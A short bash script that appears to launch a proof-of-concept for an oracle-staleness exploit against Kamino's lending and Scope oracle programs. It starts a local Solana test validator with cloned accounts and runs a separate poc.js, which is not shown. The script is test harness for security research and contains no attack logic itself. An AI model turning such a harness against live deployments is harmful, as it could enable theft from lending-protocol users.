#!/bin/bash

echo "=========================================================="
echo "   JLP ORACLE STALENESS EXPLOIT: ONE-COMMAND RUNNER"
echo "=========================================================="

echo "[+] Setting up environment..."
# Start validator in background
solana-test-validator \
  --bpf-program HFn8GnPADiny6XqUoWE8uRPPxb29ikn4yTuPa9MF2fWJ scope/target/deploy/scope.so \
  --bpf-program KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD klend/target/deploy/kamino_lending.so \
  --account 5BUwFW4nRbftYTDMbgxykoFWqWHPzahFSNAaaaJtVKsq kamino-jlp-poc/accounts/5BUwFW4nRbftYTDMbgxykoFWqWHPzahFSNAaaaJtVKsq.json \
  --account 27G8MtK7VtTcCHkpASjSDdkWWYfoqT6ggEuKidVJidD4 kamino-jlp-poc/accounts/27G8MtK7VtTcCHkpASjSDdkWWYfoqT6ggEuKidVJidD4.json \
  --account 7u3HeHxYDLhnCoErrtycNokbQYbWGzLs6JSDqGAv5PfF kamino-jlp-poc/accounts/7u3HeHxYDLhnCoErrtycNokbQYbWGzLs6JSDqGAv5PfF.json \
  --reset --quiet &
VALIDATOR_PID=$!

echo "[+] Starting local validator..."
echo "[+] Waiting for validator to initialize"

# Wait for validator
until curl -s http://localhost:8899 > /dev/null; do
  sleep 1
  echo -n "."
done
echo
echo "[+] Validator is healthy."

echo "[+] Running PoC 3.0..."
node poc/poc.js

# Cleanup
kill $VALIDATOR_PID
